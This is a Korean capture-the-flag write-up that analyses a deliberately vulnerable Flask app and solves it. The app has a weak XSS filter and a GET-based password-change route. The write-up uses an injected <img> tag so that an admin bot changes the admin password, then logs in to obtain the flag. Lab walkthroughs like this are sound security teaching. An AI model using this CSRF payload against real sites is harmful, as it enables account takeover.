### 문제 코드

```python
users = {
    'guest': 'guest',
    'admin': FLAG
}
```

ID와 PWD가 나와있습니다.

#

#### read_url

```python
def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        print(str(e))
        # return str(e)
        return False
    driver.quit()
    return True
```

해당 url을 방문합니다.

#

#### check_csrf

```python
def check_csrf(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)
```

param를 CSRF 취약점이 발생하는 파라미터로 만들어 read_url 함수를 호출합니다.

#

#### app.route("/")

```python
@app.route("/")
def index():
    session_id = request.cookies.get('sessionid', None)
    try:
        username = session_storage[session_id]
    except KeyError:
        return render_template('index.html', text='please login')

    return render_template('index.html', text=f'Hello {username}, {"flag is " + FLAG if username == "admin" else "you are not an admin"}')
```

로그인이 유무를 확인하고 안되어있으면 please login을 출력합니다.
username이 admin이면 index.html을 랜더링할 때 FLAG를 출력합니다.

#

#### app.route("/vuln")

```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "").lower()
    xss_filter = ["frame", "script", "on"]
    for _ in xss_filter:
        param = param.replace(_, "*")
    return param
```

frame, script, on 태그가 들어오면 모두 *로 변환합니다.

#

#### app.route("/flag", methods=["GET", "POST"])

```python
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param", "")
        session_id = os.urandom(16).hex()
        session_storage[session_id] = 'admin'
        if not check_csrf(param, {"name":"sessionid", "value": session_id}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'
```

flag.html 페이지를 랜더링 해줍니다.
입력창을 통해 url 일부를 입력 받습니다.

#

#### app.route('/login', methods=['GET', 'POST'])

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    elif request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        try:
            pw = users[username]
        except:
            return '<script>alert("not found user");history.go(-1);</script>'
        if pw == password:
            resp = make_response(redirect(url_for('index')) )
            session_id = os.urandom(8).hex()
            session_storage[session_id] = username
            resp.set_cookie('sessionid', session_id)
            return resp 
        return '<script>alert("wrong password");history.go(-1);</script>'
```

로그인 페이지입니다.
username과 password를 입력받습니다.

#

#### app.route("/change_password")

```python
@app.route("/change_password")
def change_password():
    pw = request.args.get("pw", "")
    session_id = request.cookies.get('sessionid', None)
    try:
        username = session_storage[session_id]
    except KeyError:
        return render_template('index.html', text='please login')

    users[username] = pw
    return 'Done'
```

패스워드를 변경하는 페이지입니다.

⇾ 입력받은 URL을 확인하는 봇이 구현되어 있다고 하니 CSRF 취약점을 이용해서 봇이 /change_password 페이지에 접속하게 하여 패스워드를 변경하면 될거 같습니다.


<br>
<br>


### 익스플로잇

admin 유저의 패스워드를 admin으로 변경하도록 공격 코드를 짜보겠습니다.

```html
<img src="/change_password?pw=admin">
```

<br>

이제 익스플로잇을 해보겠습니다.

##### 1. guest 계정으로 로그인

<img src="https://velog.velcdn.com/images/silvergun8291/post/502c8ab5-19ad-480b-9165-5d0dfdcb19ea/image.png">

<img src="https://velog.velcdn.com/images/silvergun8291/post/5715c03c-d651-4109-ac6e-859014cdca8b/image.png">

<br>

#### 2. 공격 코드 입력

<img src="https://velog.velcdn.com/images/silvergun8291/post/3f469575-6819-4aa9-82ce-738f684ee7e2/image.png">

<br>

#### 3. admin 계정으로 로그인

username : admin
password : admin

<img src="https://velog.velcdn.com/images/silvergun8291/post/9615b359-6e3d-4e64-92cb-8e34e6796a7d/image.png">

<img src="https://velog.velcdn.com/images/silvergun8291/post/e9f295ea-7b85-457d-a794-6b335c611f6d/image.png">

admin 계정으로 로그인 하는데 성공했고 플래그가 출력되었습니다.


